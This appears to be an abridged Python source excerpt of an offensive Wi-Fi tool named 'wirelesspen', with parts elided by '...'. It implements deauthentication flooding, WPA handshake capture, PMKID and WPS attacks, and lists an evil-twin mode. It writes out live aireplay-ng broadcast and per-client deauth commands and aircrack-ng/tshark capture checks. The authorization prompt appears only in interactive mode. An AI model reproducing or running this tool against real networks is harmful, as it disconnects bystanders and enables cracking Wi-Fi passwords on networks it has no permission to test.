    print(f"  {Colors.BOLD}Objetivo:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
...
"""
    ...
    try:
        proc_deauth = subprocess.Popen(deauth_cmd, shell=True, 
...
def attack_deauth():
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                  📡 WIRELESSPEN - DEAUTHENTICATION ATTACK                {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    print(f"  {Colors.BOLD}Objetivo:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
    ...
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Iniciando ataque de deautenticación masiva...")
    print(f"{Colors.RED}[!]{Colors.RESET} ADVERTENCIA: Esto desconectará a todos los clientes")
    print(f"{Colors.GRAY}    Presione Ctrl+C para detener{Colors.RESET}\n")
    ...
    try:
        ...
        while True:
            ...
            print(f"{Colors.CYAN}[*]{Colors.RESET} Enviados 100 paquetes de deauth a {essid}")
            time.sleep(1)
...
def attack_pmkid_hashcat():
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                   📡 WIRELESSPEN - PMKID HASHCAT ATTACK                  {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    print(f"  {Colors.BOLD}Objetivo:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
...
def scan_networks_wps():
    ...
    try:
        ...
        # Mostrar redes WPS
        print(f"\n{Colors.CYAN}{'='*90}")
        print(f"{Colors.BOLD}  #  | {'BSSID':<17} | {'CH':<3} | {'RSSI':<4} | {'VER':<4} | {'LOCK':<4} | ESSID")
        ...
        for i, net in enumerate(networks, 1):
            ...
            print(f"{Colors.YELLOW}{i:3}{Colors.RESET} | {net['bssid']:<17} | {net['channel']:<3} | {net['rssi']:<4} | {net['wps_version']:<4} | {lock_color}{lock_status:<4}{Colors.RESET} | {net['essid']}")
        ...
        while True:
            try:
                choice = input(f"{Colors.BOLD}Seleccione el número de la red WPS (0 para cancelar): {Colors.RESET}")
                choice = int(choice)
...
def attack_handshake() -> bool:
    ...
    os.makedirs(state.output_directory, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = os.path.join(state.output_directory, f"handshake_{essid.replace(' ', '_')}_{timestamp}")
    
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                      🤝 WPA/WPA2 HANDSHAKE CAPTURE                        {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    ...
    print(f"  Security:   {Colors.PURPLE}{target.get('encryption', 'Unknown')}{Colors.RESET}")
    ...
    try:
        ...
        if clients:
            ...
            print(f"{Colors.WARNING} No clients detected - will perform broadcast deauth")
        
        # Deauthentication phase
        print(f"{Colors.YELLOW}[4/4]{Colors.RESET} Performing intelligent deauthentication...")
        ...
        while deauth_rounds < max_rounds and not handshake_captured:
            ...
            if clients:
                ...
                for client in clients:
                    ...
                    run_command(f"aireplay-ng --deauth {CONFIG['DEAUTH_COUNT']} -a {bssid} -c {client} {interface}", timeout=15)
                    time.sleep(2)
            else:
                # Broadcast deauth
                print(f"     {Colors.ARROW} Broadcast deauthentication")
                run_command(f"aireplay-ng --deauth {CONFIG['DEAUTH_COUNT']} -a {bssid} {interface}", timeout=15)
            ...
            if os.path.exists(cap_file):
                code, result, _ = run_command(f"aircrack-ng '{cap_file}' 2>/dev/null | grep -i handshake", timeout=10)
        ...
        if not handshake_captured:
            ...
            print(f"{Colors.GRAY}   Press Ctrl+C when you see 'WPA handshake' or after sufficient time{Colors.RESET}")
            try:
    ...
    code, result, stderr = run_command(f"aircrack-ng '{cap_file}' 2>/dev/null", timeout=30)
    ...
    if not handshake_found:
        ...
        code, tshark_result, _ = run_command(f"tshark -r '{cap_file}' -Y 'wlan.fc.type_subtype == 0x08 || eapol' -c 10 2>/dev/null", timeout=15)
    ...
    if handshake_found:
        ...
        print(f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.WHITE}                            CAPTURE RESULTS                                 {Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
...
For detailed help: %(prog)s --help-full
    ...
    # Attack modes
    parser.add_argument('attack', nargs='?', choices=[
        'handshake', 'pmkid', 'wps', 'pixie', 'deauth', 'scan', 'evil_twin'
    ], help='Attack mode')
    
    # Interface options
    parser.add_argument('-i', '--interface', metavar='IFACE',
                        help='WiFi interface (e.g., wlan0)')
    parser.add_argument('-t', '--target', metavar='BSSID',
                        help='Target BSSID (MAC address)')
    parser.add_argument('-c', '--channel', metavar='CH', type=int,
                        help='Specific channel to target (1-14)')
    
    # Scan options
    parser.add_argument('--scan', action='store_true',
                        help='Scan for networks')
    parser.add_argument('--scan-time', type=int, default=30, metavar='SEC',
                        help='Scan duration in seconds (default: 30)')
    
    # Attack options
    parser.add_argument('--deauth-count', type=int, default=20, metavar='N',
    ...
    parser.add_argument('--auto', action='store_true',
                        help='Automated mode (minimal interaction)')
    ...
    parser.add_argument('--interfaces', action='store_true',
                        help='List WiFi interfaces and exit')
    parser.add_argument('--check', action='store_true',
                        help='Check system dependencies and exit')
    parser.add_argument('--diagnostics', action='store_true',
                        help='Run wireless diagnostics')
    ...
    if args.interface:
        state.network_card = args.interface
        print(f"{Colors.SUCCESS} Using interface: {Colors.CYAN}{state.network_card}{Colors.RESET}")
    else:
        # Smart interface detection
        print(f"{Colors.INFO} Auto-detecting wireless interfaces...")
        wireless_cards = []
        
        code, output, _ = run_command("iwconfig 2>/dev/null | grep -oP '^[a-zA-Z0-9]+(?=\\s+IEEE 802.11)'", timeout=10)
        if output.strip():
            wireless_cards = output.strip().split('\n')
        
        if len(wireless_cards) == 1:
            state.network_card = wireless_cards[0]
            print(f"{Colors.SUCCESS} Auto-detected: {Colors.CYAN}{state.network_card}{Colors.RESET}")
        elif len(wireless_cards) > 1:
            print(f"{Colors.WARNING} Multiple interfaces found: {Colors.CYAN}{', '.join(wireless_cards)}{Colors.RESET}")
            
            if state.auto_mode:
                # Use first interface in auto mode
                state.network_card = wireless_cards[0]
                print(f"{Colors.INFO} Auto-selected: {Colors.CYAN}{state.network_card}{Colors.RESET}")
            else:
                print(f"{Colors.INFO} Use {Colors.CYAN}-i <interface>{Colors.RESET} to specify one")
                sys.exit(1)
        else:
            print(f"{Colors.FAILURE} No wireless interfaces found")
            print(f"{Colors.INFO} Use {Colors.CYAN}--interfaces{Colors.RESET} to list all network interfaces")
            sys.exit(1)
    
    # Verify interface exists and is wireless
    code, _, _ = run_command(f"iwconfig {state.network_card} 2>/dev/null", timeout=5)
    if code != 0:
        print(f"{Colors.FAILURE} Interface {state.network_card} is not a valid wireless interface")
        sys.exit(1)
    ...
    if not handle_monitor_mode():
        ...
        print(f"{Colors.INFO} Try: {Colors.CYAN}--diagnostics -i {state.network_card}{Colors.RESET}")
        sys.exit(1)
    
    print(f"{Colors.SUCCESS} Monitor mode active: {Colors.CYAN}{state.monitor_interface}{Colors.RESET}")
    
    # Handle scan-only operation
    if args.scan:
        target = scan_networks(args.scan_time, str(args.channel) if args.channel else None)
        if target:
    ...
    if args.attack:
        ...
        print(f"{Colors.SUCCESS} Attack mode: {Colors.YELLOW}{args.attack.upper()}{Colors.RESET}")
        
        # Handle target specification
        if args.target:
            # TODO: Implement target specification by BSSID
            print(f"{Colors.INFO} Target BSSID: {Colors.YELLOW}{args.target}{Colors.RESET}")
    else:
        # Interactive mode
        if state.auto_mode:
    ...
    try:
        if state.attack_mode == 'handshake':
            ...
            if not state.auto_mode:
                ...
                confirm = input(f"{Colors.YELLOW}Are you authorized to perform this attack? [y/N]: {Colors.RESET}").strip().lower()
                if confirm != 'y':
...
def show_interactive_menu():
    ...
    while True:
        try:
            cmd = input(f"{Colors.BLUE}wirelesspen{Colors.RESET}{Colors.GRAY}:{state.session_id}{Colors.RESET} > ").strip().lower()
            ...
            if cmd in ['exit', 'quit', 'q']:
                ...
                confirm = input(f"{Colors.YELLOW}Authorized for testing? [y/N]: {Colors.RESET}")
                if confirm.lower() == 'y':
                ...
                print(f"{Colors.INFO} Verbose mode: {Colors.CYAN}{'ON' if state.verbose_mode else 'OFF'}{Colors.RESET}")
            elif cmd == '':
                continue
            else:
...
def show_status():
    ...
    print(f"  Attack Mode:    {state.attack_mode or 'None'}")
    print(f"  Target:         {state.target_network.get('essid', 'None') if state.target_network else 'None'}")
